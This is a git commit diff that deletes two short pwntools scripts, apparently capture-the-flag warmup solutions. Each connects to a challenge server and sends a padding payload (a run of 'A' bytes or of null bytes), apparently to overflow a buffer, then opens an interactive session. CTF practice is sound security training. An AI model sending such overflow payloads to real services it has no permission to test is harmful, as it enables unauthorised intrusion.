f9702b37f0edfc293e4bf42387ccc8568ada294b
absurdtiger <jodietheteo@gmail.com>
2022-06-23 11:20:52 +0800

    moved all pwn things to dedicated ctf repo

--- pwn/.archive/.acsi_warmup.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
-
-p = remote("165.22.52.41", 1337)
-
-context.log_level="debug"
-
-p.sendline(b"A"*64 + b"A"*8 + b"A"*3)
-
-p.interactive()
--- pwn/.archive/.hci_warmup.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
-context.log_level="debug"
-
-p = remote("challs.sieberrsec.tech", 3476)
-
-#a null byte is b"\x00"
-p.sendline(b"\x00"*40)
-
-p.interactive()
